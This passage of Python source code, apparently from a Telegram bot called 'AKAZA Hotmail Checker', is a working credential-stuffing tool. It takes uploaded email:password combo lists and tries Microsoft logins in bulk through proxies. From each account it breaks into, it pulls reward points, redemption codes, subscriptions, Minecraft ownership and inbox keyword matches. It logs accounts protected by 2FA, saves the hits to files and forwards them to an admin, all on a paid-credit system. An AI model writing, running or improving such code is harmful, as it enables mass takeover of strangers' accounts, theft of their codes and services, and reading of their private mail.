                    'Xbox Live Gold': 'XBOX LIVE GOLD',
                    'Microsoft 365 Family': 'M365 FAMILY',
                    'Microsoft 365 Personal': 'M365 PERSONAL',
                    'Office 365': 'OFFICE 365',
                    'OneDrive': 'ONEDRIVE',
                }
                for kw, name in sub_kw.items():
                    if kw in rs.text:
                        sub = {'name': name}
                        ren = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', rs.text)
                        if ren:
                            sub['renewal'] = ren.group(1)
                            try:
                                d = (datetime.fromisoformat(ren.group(1)) - datetime.now()).days
                                sub['days'] = d
                                sub['expired'] = d < 0
                            except Exception:
                                pass
                        ar = re.search(r'"autoRenew"\s*:\s*(true|false)', rs.text)
                        if ar: sub['auto_renew'] = ar.group(1) == 'true'
                        result['subs'].append(sub)
                if result['subs']:
                    active = [s for s in result['subs'] if not s.get('expired')]
                    result['status'] = 'PREMIUM' if active else 'EXPIRED'
            except Exception:
                pass
        except Exception:
            pass
        return result

    # ------------------------------------------------------------------
    # Profile (name + country)
    # ------------------------------------------------------------------
    def get_profile(self, access_token, cid):
        try:
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
            }
            r = self.session.get(
                'https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                headers=headers, timeout=10, verify=False)
            data = r.json()
            accs = data.get('accounts', [{}])
            name = (accs[0].get('displayName') or
                    data.get('displayName') or 'Unknown')
            country = (accs[0].get('location') or
                       accs[0].get('country') or
                       data.get('country') or 'Unknown')
            return name, country
        except Exception:
            return 'Unknown', 'Unknown'

    # ------------------------------------------------------------------
    # Minecraft via Xbox chain
    # ------------------------------------------------------------------
    def get_minecraft(self, access_token):
        try:
            # XBL
            xbl = self.session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    'Properties': {
                        'AuthMethod': 'RPS',
                        'SiteName': 'user.auth.xboxlive.com',
                        'RpsTicket': f'd={access_token}'
                    },
                    'RelyingParty': 'http://auth.xboxlive.com',
                    'TokenType': 'JWT'
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10, verify=False
            ).json()
            xbl_token = xbl.get('Token')
            userhash = xbl.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
            if not xbl_token or not userhash:
                return {'owned': False}
            # XSTS
            xsts = self.session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbl_token]},
                    'RelyingParty': 'rp://api.minecraftservices.com/',
                    'TokenType': 'JWT'
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10, verify=False
            ).json()
            xsts_token = xsts.get('Token')
            if not xsts_token:
                return {'owned': False}
            # Minecraft login
            mc_auth = self.session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f'XBL3.0 x={userhash};{xsts_token}'},
                headers={'Content-Type': 'application/json'},
                timeout=10, verify=False
            ).json()
            mc_token = mc_auth.get('access_token')
            if not mc_token:
                return {'owned': False}
            # Profile
            profile = self.session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=10, verify=False
            )
            if profile.status_code == 200:
                pd = profile.json()
                return {
                    'owned': True,
                    'username': pd.get('name', 'Unknown'),
                    'uuid': pd.get('id', ''),
                    'capes': [cape.get('alias', '') for cape in pd.get('capes', [])]
                }
        except Exception:
            pass
        return {'owned': False}

    # ------------------------------------------------------------------
    # Inbox Keyword Scan (batched OR queries)
    # ------------------------------------------------------------------
    def scan_inbox(self, access_token, cid, user_keywords):
        found = {}
        try:
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'User-Agent': 'Outlook-Android/2.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            }
            all_kws = list(SERVICE_KEYWORDS.keys()) + (user_keywords or [])
            all_kws = list(dict.fromkeys(all_kws))  # deduplicate

            BATCH = 8
            for i in range(0, len(all_kws), BATCH):
                batch = all_kws[i:i+BATCH]
                or_query = ' OR '.join(f'"{kw}"' for kw in batch)
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]},
                        'From': 0,
                        'Query': {'QueryString': or_query},
                        'Size': 5,
                        'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]
                    }]
                }
                try:
                    r = self.session.post(
                        'https://outlook.live.com/search/api/v2/query',
                        json=payload, headers=headers, timeout=8, verify=False)
                    data = r.json()
                    er = data.get('EntitySets', [{}])[0]
                    rs = er.get('ResultSets', [{}])[0]
                    if rs.get('Total', 0) > 0:
                        # Individual lookup for this batch
                        for kw in batch:
                            try:
                                p2 = {
                                    'Cvid': str(uuid.uuid4()),
                                    'Scenario': {'Name': 'owa.react'},
                                    'TimeZone': 'UTC',
                                    'TextDecorations': 'Off',
                                    'EntityRequests': [{
                                        'EntityType': 'Conversation',
                                        'ContentSources': ['Exchange'],
                                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]},
                                        'From': 0,
                                        'Query': {'QueryString': f'"{kw}"'},
                                        'Size': 3,
                                        'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]
                                    }]
                                }
                                r2 = self.session.post(
                                    'https://outlook.live.com/search/api/v2/query',
                                    json=p2, headers=headers, timeout=6, verify=False)
                                d2 = r2.json()
                                er2 = d2.get('EntitySets', [{}])[0]
                                rs2 = er2.get('ResultSets', [{}])[0]
                                cnt = rs2.get('Total', 0)
                                if cnt > 0:
                                    display = SERVICE_KEYWORDS.get(kw, kw)
                                    found[display] = found.get(display, 0) + cnt
                            except Exception:
                                pass
                except Exception:
                    pass
        except Exception as e:
            logger.debug(f"Inbox scan error: {e}")
        return found

    # ------------------------------------------------------------------
    # FULL CHECK
    # ------------------------------------------------------------------
    def check(self, email, password, user_keywords=None, fast_mode=False):
        result = {'email': email, 'password': password, 'status': 'bad'}
        try:
            url_post, ppft = self.get_sftag_params()
            if not url_post:
                result['status'] = 'error'
                return result

            status, token = self.do_login(email, password, url_post, ppft)
            if status == 'BAD':
                return result
            if status == '2FA':
                result['status'] = '2fa'
                return result
            if status != 'TOKEN' or not token:
                result['status'] = 'error'
                return result

            access_token = token
            # Get CID from cookies
            cid = ''
            for cookie in self.session.cookies:
                if cookie.name == 'MSPCID':
                    cid = cookie.value.upper()
                    break

            result['status'] = 'hit'

            # Capture — all fields
            points = self.get_rewards_points()
            codes = self.get_redemption_codes()
            name, country = self.get_profile(access_token, cid)

            result['pts'] = points
            result['codes'] = codes
            result['name'] = name
            result['country'] = country

            if not fast_mode:
                subs = self.get_microsoft_subs()
                mc = self.get_minecraft(access_token)
                inbox = self.scan_inbox(access_token, cid, user_keywords or [])
                result['subs'] = subs
                result['mc'] = mc
                result['inbox'] = inbox
            else:
                result['subs'] = {'status': 'FREE', 'subs': [], 'balance': '', 'card': ''}
                result['mc'] = {'owned': False}
                result['inbox'] = {}

        except Exception as e:
            logger.debug(f"Check error {email}: {e}")
            result['status'] = 'error'
        return result


# ============================================================================
# KEYBOARDS
# ============================================================================
def main_kb(uid):
    kb = [
        [InlineKeyboardButton("🔍 Check Accounts", callback_data="check"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("📊 My Stats", callback_data="stats"),
         InlineKeyboardButton("🌐 Proxies", callback_data="proxies")],
        [InlineKeyboardButton("📖 Commands", callback_data="cmds")],
    ]
    if db.is_mod(uid):
        kb.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin")])
    kb.append([InlineKeyboardButton(f"ℹ️ {TAG}", callback_data="tag")])
    return InlineKeyboardMarkup(kb)

BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])


# ============================================================================
# /start
# ============================================================================
async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if db.is_banned(uid):
        return
    creds = db.get_credits(uid)
    cred_txt = "♾️ Unlimited" if uid == ADMIN_ID else f"`{creds}`"
    has = db.has_access(uid)
    acc_txt = "✅ Active" if has else "❌ No Access"
    fm = "⚡ Fast" if user_fast_mode.get(uid) else "🔬 Full"
    msg = (
        f"🔥 *AKAZA Hotmail Checker*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: `{uid}`\n"
        f"💰 Credits: {cred_txt}\n"
        f"🔑 Access: {acc_txt}\n"
        f"🌐 Proxies: `{len(PROXIES_LIST)}`\n"
        f"⚡ Mode: {fm}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"_{TAG}_"
    )
    kb = main_kb(uid)
    if u.callback_query:
        try:
            await u.callback_query.edit_message_text(msg, parse_mode='Markdown', reply_markup=kb)
        except Exception:
            pass
    else:
        await u.message.reply_text(msg, parse_mode='Markdown', reply_markup=kb)


# ============================================================================
# Callback handler
# ============================================================================
async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    uid = q.from_user.id
    await q.answer()
    data = q.data

    if data == "back":
        await start(u, c)
        return

    if data == "tag":
        await q.edit_message_text(
            f"*{TAG}*\n\nThis bot is exclusively for {TAG} users.\n\nContact admin to get access.",
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if data == "check":
        await q.edit_message_text(
            "📝 *How to Check*\n\n"
            "1️⃣ Upload a `.txt` file with `email:password` combos\n"
            "2️⃣ Or paste directly in chat: `email:pass` (one per line)\n"
            "3️⃣ To upload proxies: upload `.txt` file with caption `proxy`\n\n"
            "💡 Use /fastmode to toggle fast/full check mode",
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if data == "settings":
        s = db.get_user_settings(uid)
        kws = ', '.join(s['keywords']) if s['keywords'] else 'None'
        fm = "⚡ Fast Mode" if user_fast_mode.get(uid) else "🔬 Full Mode"
        await q.edit_message_text(
            f"⚙️ *Settings*\n\n"
            f"🔢 Threads: `{s['threads']}`\n"
            f"🔑 Keywords: `{kws}`\n"
            f"📡 Mode: {fm}\n\n"
            f"*Commands:*\n"
            f"`/threads 1-300` — set threads\n"
            f"`/keywords word1,word2` — set keywords\n"
            f"`/addkw word` — add keyword\n"
            f"`/clearkw` — clear keywords\n"
            f"`/fastmode` — toggle fast/full mode",
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if data == "stats":
        s = db.user_stats(uid)
        info = db.get_user_info(uid)
        exp = info.get('access_expiry', '') if info else ''
        exp_txt = f"\n📅 Expiry: `{exp[:10]}`" if exp else ''
        await q.edit_message_text(
            f"📊 *Your Stats*\n\n"
            f"💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n"
            f"🔍 Total Checks: `{s['checks']}`\n"
            f"🎯 Total Hits: `{s['hits']}`\n"
            f"🌐 Proxies Loaded: `{len(PROXIES_LIST)}`{exp_txt}\n\n"
            f"_{TAG}_",
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if data == "proxies":
        await q.edit_message_text(
            f"🌐 *Proxy Manager*\n\n"
            f"Loaded: `{len(PROXIES_LIST)}` proxies\n\n"
            f"*To load proxies:*\n"
            f"Upload a `.txt` file with caption `proxy`\n\n"
            f"*Supported formats:*\n"
            f"`ip:port`\n"
            f"`ip:port:user:pass`\n"
            f"`http://ip:port`\n"
            f"`socks5://ip:port`",
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if data == "cmds":
        await q.edit_message_text(
            f"📖 *All Commands*\n\n"
            f"*User Commands:*\n"
            f"`/start` — main menu\n"
            f"`/threads N` — set thread count\n"
            f"`/keywords w1,w2` — set inbox keywords\n"
            f"`/addkw word` — add one keyword\n"
            f"`/clearkw` — clear all keywords\n"
            f"`/fastmode` — toggle fast/full mode\n"
            f"`/check email:pass` — check one account\n"
            f"`/stats` — view your stats\n\n"
            f"*Admin Commands (prefix `!!`):*\n"
            f"`!!help` — admin help\n"
            f"`!!addcredits [uid] [n]`\n"
            f"`!!setcredits [uid] [n]`\n"
            f"`!!resetcredits [uid]`\n"
            f"`!!grant [uid]` — give permanent access\n"
            f"`!!revoke [uid]` — remove access\n"
            f"`!!addaccess [uid] [days]`\n"
            f"`!!ban [uid]` / `!!unban [uid]`\n"
            f"`!!mod [uid]` / `!!unmod [uid]` (owner only)\n"
            f"`!!info [uid]` — user info\n"
            f"`!!stats` — global stats\n"
            f"`!!listmods` — list all mods\n"
            f"`!!broadcast [msg]` — send to all users",
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if data == "admin":
        if not db.is_mod(uid):
            return
        s = db.get_global_stats()
        mods = db.list_mods()
        mod_list = ', '.join([f"@{m['username'] or m['uid']}" for m in mods]) or 'None'
        await q.edit_message_text(
            f"🛠 *Admin Panel*\n\n"
            f"👥 Total Users: `{s['total']}`\n"
            f"✅ Active Users: `{s['active']}`\n"
            f"🔍 Total Checks: `{s['checks']}`\n"
            f"🎯 Total Hits: `{s['hits']}`\n"
            f"🌐 Proxies: `{len(PROXIES_LIST)}`\n\n"
            f"🛡 Mods: {mod_list}\n\n"
            f"Use `!!help` for all admin commands",
            parse_mode='Markdown', reply_markup=BACK_KB)
        return


# ============================================================================
# Handle Proxy Upload
# ============================================================================
async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid):
        return
    try:
        f = await c.bot.get_file(u.message.document.file_id)
        content = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
        global PROXIES_LIST
        PROXIES_LIST = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
        await u.message.reply_text(
            f"✅ *Proxies Loaded*\n\n"
            f"📡 Count: `{len(PROXIES_LIST)}`\n"
            f"💡 Tip: threads will auto-scale with proxies",
            parse_mode='Markdown')
    except Exception as e:
        await u.message.reply_text(f"❌ Error loading proxies: {e}")


# ============================================================================
# Handle Combo Check (file or text)
# ============================================================================
async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid):
        return
    if not db.has_access(uid):
        await u.message.reply_text(
            f"❌ *No Access*\n\nContact {TAG} to get access.",
            parse_mode='Markdown')
        return

    credits = db.get_credits(uid)
    if credits <= 0 and uid != ADMIN_ID:
        await u.message.reply_text(
            f"❌ *No Credits*\n\nContact {TAG} to get credits.",
            parse_mode='Markdown')
        return

    # Get combo lines
    if u.message.document:
        try:
            f = await c.bot.get_file(u.message.document.file_id)
            content = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
        except Exception:
            await u.message.reply_text("❌ Failed to download file.")
            return
    else:
        content = u.message.text or ''

    lines = [l.strip() for l in content.split('\n') if ':' in l and '@' in l]
    if not lines:
        lines = [l.strip() for l in content.split('\n') if ':' in l]
    if not lines:
        return

    # Credit check
    if uid != ADMIN_ID and credits < len(lines):
        await u.message.reply_text(
            f"❌ Not enough credits.\n"
            f"You have `{credits}` credits but need `{len(lines)}`.",
            parse_mode='Markdown')
        return

    settings = db.get_user_settings(uid)
    threads = settings['threads']
    if not PROXIES_LIST:
        threads = min(threads, 10)
    else:
        threads = min(threads, 300)

    fm = user_fast_mode.get(uid, False)
    keywords = settings['keywords']

    ts = int(time.time())
    hits_file = f"@larpsupport_hits_{uid}_{ts}.txt"
    codes_file = f"@larpsupport_codes_{uid}_{ts}.txt"
    kw_file = f"@larpsupport_keywords_{uid}_{ts}.txt"
    tfa_file = f"@larpsupport_2fa_{uid}_{ts}.txt"

    status_msg = await u.message.reply_text(
        f"🔄 *AKAZA Engine Starting...*\n\n"
        f"📋 Combos: `{len(lines)}`\n"
        f"⚡ Threads: `{threads}`\n"
        f"🌐 Proxies: `{len(PROXIES_LIST)}`\n"
        f"🔬 Mode: `{'Fast' if fm else 'Full'}`\n\n"
        f"_{TAG}_",
        parse_mode='Markdown')

    hits = bad = tfa = errors = checked = 0
    start_time = time.time()
    last_hits = []
    last_update = 0
    update_lock = asyncio.Lock()

    def run_check(line):
        try:
            parts = line.split(':', 1)
            if len(parts) != 2:
                return None
            e, p = parts[0].strip(), parts[1].strip()
            proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
            checker = AkazaChecker(proxy=proxy)
            return checker.check(e, p, keywords, fast_mode=fm)
        except Exception:
            return None

    loop = asyncio.get_running_loop()
    sem = asyncio.Semaphore(threads)

    async def sem_worker(line):
        nonlocal hits, bad, tfa, errors, checked, last_update
        async with sem:
            data = await loop.run_in_executor(bot_executor, run_check, line)
            if not data:
                errors += 1
                checked += 1
                return
            checked += 1
            db.use_credit(uid)
            st = data.get('status', 'bad')

            if st == 'hit':
                hits += 1
                db.add_hit(uid)
                db.save_result(uid, data['email'], 'hit', data)

                pts = data.get('pts', 0)
                tier = ('💎 ULTRA HIT' if pts >= 20000
                        else '⭐ PREMIUM HIT' if pts >= 7000
                        else '🎯 HIT')
                country = data.get('country', 'N/A')
                name = data.get('name', 'N/A')
                codes = data.get('codes', [])
                subs = data.get('subs', {})
                mc = data.get('mc', {})
                inbox = data.get('inbox', {})

                active_subs = [s['name'] for s in subs.get('subs', [])
                               if not s.get('expired')]

                msg = (
                    f"{tier}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📧 `{data['email']}`\n"
                    f"🔑 `{data['password']}`\n"
                    f"👤 {name} | 🌍 {country}\n"
                    f"⭐ Points: `{pts:,}`\n"
                )

                # Codes grouped by category
                if codes:
                    cat_map = {}
                    for cd in codes:
                        cat = cd.get('category', 'Unknown')
                        cat_map.setdefault(cat, []).append(cd)
                    msg += "━━━━━━━━━━━━━━━━━━━━\n🎮 *Codes:*\n"
                    for cat, clist in cat_map.items():
                        for cd in clist:
                            line_c = f"  • `{cd['code']}` — {cd.get('info','')}"
                            if cd.get('redemption_url'):
                                line_c += f"\n    🔗 [Redeem]({cd['redemption_url']})"
                            msg += line_c + '\n'

                # Subscriptions
                if active_subs:
                    msg += f"━━━━━━━━━━━━━━━━━━━━\n🎮 *Subs:* {', '.join(active_subs)}\n"
                if subs.get('balance'):
                    msg += f"💳 Balance: `{subs['balance']}`\n"

                # Minecraft
                if mc.get('owned'):
                    capes = ', '.join(mc.get('capes', [])) or 'None'
                    msg += (f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"⛏️ *Minecraft:* `{mc['username']}`\n"
                            f"   Capes: {capes}\n")

                # Inbox
                if inbox:
                    msg += "━━━━━━━━━━━━━━━━━━━━\n📬 *Inbox Services:*\n"
                    for svc, cnt in list(inbox.items())[:10]:
                        msg += f"  • {svc}: `{cnt}` emails\n"
                    if len(inbox) > 10:
                        msg += f"  _...+{len(inbox)-10} more_\n"

                msg += f"━━━━━━━━━━━━━━━━━━━━\n_{TAG}_"

                last_hits.append(f"✅ {data['email']}")
                if len(last_hits) > 5:
                    last_hits.pop(0)

                try:
                    await c.bot.send_message(uid, msg, parse_mode='Markdown',
                                             disable_web_page_preview=True)
                except Exception:
                    pass

                # Notify admin
                if uid != ADMIN_ID:
                    try:
                        await c.bot.send_message(
                            ADMIN_ID,
                            f"📢 *User {uid} Hit*\n\n{msg}",
                            parse_mode='Markdown',
                            disable_web_page_preview=True)
                    except Exception:
                        pass

                # Save to files
                with open(hits_file, 'a', encoding='utf-8') as hf:
                    hf.write(
                        f"{TAG}\n"
                        f"Email: {data['email']}\n"
                        f"Pass:  {data['password']}\n"
                        f"Name:  {name} | Country: {country}\n"
                        f"Points: {pts}\n"
                        f"Subs: {', '.join(active_subs) or 'None'}\n"
                        f"Minecraft: {mc.get('username', 'No') if mc.get('owned') else 'No'}\n"
                        f"{'='*40}\n\n"
                    )
                if codes:
                    with open(codes_file, 'a', encoding='utf-8') as cf:
                        cf.write(f"{TAG}\nEmail: {data['email']}\n")
                        for cd in codes:
                            cf.write(
                                f"Code: {cd['code']} | Cat: {cd.get('category','')} | "
                                f"Info: {cd.get('info','')} | "
                                f"Redeem: {cd.get('redemption_url','N/A')}\n"
                            )
                        cf.write('='*40 + '\n\n')
                if inbox:
                    with open(kw_file, 'a', encoding='utf-8') as kf:
                        kf.write(f"{TAG}\nEmail: {data['email']}\n")
                        for svc, cnt in inbox.items():
                            kf.write(f"  {svc}: {cnt} emails\n")
                        kf.write('='*40 + '\n\n')

            elif st == '2fa':
                tfa += 1
                with open(tfa_file, 'a', encoding='utf-8') as tf:
                    tf.write(f"{data['email']}:{data['password']}\n")
            elif st == 'error':
                errors += 1
            else:
                bad += 1

            # Status update (every 2 seconds)
            async with update_lock:
                now = time.time()
                if now - last_update > 2.0 or checked == len(lines):
                    last_update = now
                    el = now - start_time
                    cpm = int((checked / el) * 60) if el > 0 else 0
                    pct = round((checked / len(lines)) * 100, 1) if lines else 0
                    prg = (
                        f"⚡ *AKAZA Live Check*\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📊 Progress: `{checked}/{len(lines)}` ({pct}%)\n"
                        f"🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n"
                        f"🔒 2FA: `{tfa}` | ❌ Errors: `{errors}`\n"
                        f"⚡ CPM: `{cpm}`\n"
                        f"⏱ Time: `{int(el)}s`\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"🕒 *Last Hits:*\n"
                        f"`{'\\n'.join(last_hits) or 'None yet'}`\n"
                        f"_{TAG}_"
                    )
                    try:
                        await status_msg.edit_text(prg, parse_mode='Markdown')
                    except Exception:
                        pass

    await asyncio.gather(*(sem_worker(l) for l in lines))

    # Final summary
    el = time.time() - start_time
    cpm_final = int((checked / el) * 60) if el > 0 else 0
    summary = (
        f"✅ *Check Complete*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 Checked: `{checked}`\n"
        f"🎯 Hits: `{hits}`\n"
        f"💀 Bad: `{bad}`\n"
        f"🔒 2FA: `{tfa}`\n"
        f"❌ Errors: `{errors}`\n"
        f"⚡ Avg CPM: `{cpm_final}`\n"
        f"⏱ Duration: `{int(el)}s`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"_{TAG}_"
    )
    try:
        await status_msg.edit_text(summary, parse_mode='Markdown')
    except Exception:
        pass

    # Send result files
    for fpath, caption in [
        (hits_file, f"🎯 Hits — {TAG}"),
        (codes_file, f"🎮 Codes — {TAG}"),
        (kw_file, f"📬 Keyword Results — {TAG}"),
        (tfa_file, f"🔒 2FA Accounts — {TAG}"),
    ]:
        if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
            try:
                with open(fpath, 'rb') as fh:
                    await u.message.reply_document(fh, caption=caption)
            except Exception:
                pass
            try:
                os.remove(fpath)
            except Exception:
                pass


# ============================================================================
# Single check command
# ============================================================================
async def single_check_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid):
        return
    if not c.args:
        await u.message.reply_text("Usage: `/check email:password`", parse_mode='Markdown')
        return
    line = c.args[0]
    if ':' not in line:
        await u.message.reply_text("❌ Format: `email:password`", parse_mode='Markdown')
        return
    msg = await u.message.reply_text("🔄 Checking...", parse_mode='Markdown')
    fm = user_fast_mode.get(uid, False)
    settings = db.get_user_settings(uid)

    def do():
        proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
        return AkazaChecker(proxy=proxy).check(
            *line.split(':', 1), settings['keywords'], fast_mode=fm)

    loop = asyncio.get_running_loop()
    data = await loop.run_in_executor(bot_executor, do)
    st = data.get('status', 'bad')
    if st == 'hit':
        pts = data.get('pts', 0)
        tier = '💎 ULTRA' if pts >= 20000 else '⭐ PREMIUM' if pts >= 7000 else '🎯 HIT'
        codes = data.get('codes', [])
        inbox = data.get('inbox', {})
        mc = data.get('mc', {})
        subs = data.get('subs', {})
        active_subs = [s['name'] for s in subs.get('subs', []) if not s.get('expired')]
        result = (
            f"{tier}\n"
            f"📧 `{data['email']}`\n"
            f"🔑 `{data['password']}`\n"
            f"👤 {data.get('name','N/A')} | 🌍 {data.get('country','N/A')}\n"
            f"⭐ Points: `{pts:,}`\n"
            f"🎮 Codes: `{len(codes)}`\n"
            f"📬 Services: `{len(inbox)}`\n"
            f"⛏️ Minecraft: `{'Yes - ' + mc.get('username','') if mc.get('owned') else 'No'}`\n"
            f"🎮 Subs: `{', '.join(active_subs) or 'None'}`\n"
            f"_{TAG}_"
        )
        db.use_credit(uid)
        db.add_hit(uid)
    elif st == '2fa':
        result = f"🔒 *2FA Account*\n`{line}`\n_{TAG}_"
    elif st == 'error':
        result = f"❌ *Error checking account*\n_{TAG}_"
    else:
        result = f"💀 *Bad Account*\n_{TAG}_"
    try:
        await msg.edit_text(result, parse_mode='Markdown', disable_web_page_preview=True)
    except Exception:
        pass


# ============================================================================
# User commands
# ============================================================================
async def cmd_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    try:
        t = int(c.args[0])
        t = max(1, min(t, 300))
        db.update_settings(uid, threads=t)
        await u.message.reply_text(f"✅ Threads set to `{t}`", parse_mode='Markdown')
    except Exception:
        await u.message.reply_text("Usage: `/threads 10`", parse_mode='Markdown')

async def cmd_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    if c.args:
        kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]
        db.update_settings(uid, keywords=kws)
        await u.message.reply_text(f"✅ Keywords: `{', '.join(kws)}`", parse_mode='Markdown')
    else:
        await u.message.reply_text("Usage: `/keywords netflix,paypal,steam`", parse_mode='Markdown')

async def cmd_addkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    if c.args:
        kw = c.args[0].strip()
        s = db.get_user_settings(uid)
        kws = s['keywords']
        if kw not in kws:
            kws.append(kw)
        db.update_settings(uid, keywords=kws)
        await u.message.reply_text(f"✅ Added keyword: `{kw}`", parse_mode='Markdown')

async def cmd_clearkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    db.update_settings(uid, keywords=[])
    await u.message.reply_text("✅ Keywords cleared.", parse_mode='Markdown')

async def cmd_fastmode(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    user_fast_mode[uid] = not user_fast_mode.get(uid, False)
    mode = "⚡ Fast Mode" if user_fast_mode[uid] else "🔬 Full Mode"
    await u.message.reply_text(
        f"✅ Switched to *{mode}*\n\n"
        f"Fast: points + codes only (higher CPM)\n"
        f"Full: everything including inbox scan",
        parse_mode='Markdown')

async def cmd_stats(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    s = db.user_stats(uid)
    info = db.get_user_info(uid)
    exp = info.get('access_expiry', '') if info else ''
    await u.message.reply_text(
        f"📊 *Your Stats*\n\n"
        f"💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n"
        f"🔍 Checks: `{s['checks']}`\n"
        f"🎯 Hits: `{s['hits']}`\n"
        f"🌐 Proxies: `{len(PROXIES_LIST)}`\n"
        f"⚡ Mode: `{'Fast' if user_fast_mode.get(uid) else 'Full'}`\n"
        + (f"📅 Access Expiry: `{exp[:10]}`\n" if exp else '') +
        f"\n_{TAG}_",
        parse_mode='Markdown')


# ============================================================================
# Admin Commands
# ============================================================================
async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.is_mod(uid): return
    txt = u.message.text or ''
    if not txt.startswith('!!'):
        return
    try:
        parts = txt.split(None, 3)
        cmd = parts[0][2:].lower()

        async def reply(msg):
            await u.message.reply_text(msg, parse_mode='Markdown')

        if cmd == 'help':
            await reply(
                f"🛠 *Admin Commands*\n\n"
                f"`!!addcredits [uid] [n]` — add credits\n"
                f"`!!setcredits [uid] [n]` — set credits\n"
                f"`!!resetcredits [uid]` — reset to 0\n"
                f"`!!grant [uid]` — permanent access\n"
                f"`!!revoke [uid]` — remove access\n"
                f"`!!addaccess [uid] [days]` — timed access\n"
                f"`!!ban [uid]` / `!!unban [uid]`\n"
                f"`!!mod [uid]` / `!!unmod [uid]` _(owner)_\n"
                f"`!!info [uid]` — user info\n"
                f"`!!stats` — global stats\n"
                f"`!!listmods` — list moderators\n"
                f"`!!broadcast [msg]` — message all users\n"
                f"`!!setthreads [uid] [n]` — set threads\n"
                f"`!!credits [uid]` — view credits"
            )
        elif cmd == 'addcredits' and len(parts) >= 3:
            target, amt = int(parts[1]), int(parts[2])
            db.add_credits(target, amt)
            await reply(f"✅ Added `{amt}` credits to `{target}`")
        elif cmd == 'setcredits' and len(parts) >= 3:
            target, amt = int(parts[1]), int(parts[2])
            db.set_credits(target, amt)
            await reply(f"✅ Set credits to `{amt}` for `{target}`")
        elif cmd == 'resetcredits' and len(parts) >= 2:
            target = int(parts[1])
            db.reset_credits(target)
            await reply(f"✅ Reset credits for `{target}`")
        elif cmd == 'credits' and len(parts) >= 2:
            target = int(parts[1])
            cr = db.get_credits(target)
            await reply(f"💰 User `{target}` has `{cr}` credits")
        elif cmd == 'grant' and len(parts) >= 2:
            target = int(parts[1])
            db.add_user(target, '', '')
            db.grant_access(target)
            await reply(f"✅ Granted permanent access to `{target}`")
        elif cmd == 'revoke' and len(parts) >= 2:
            target = int(parts[1])
            db.revoke_access(target)
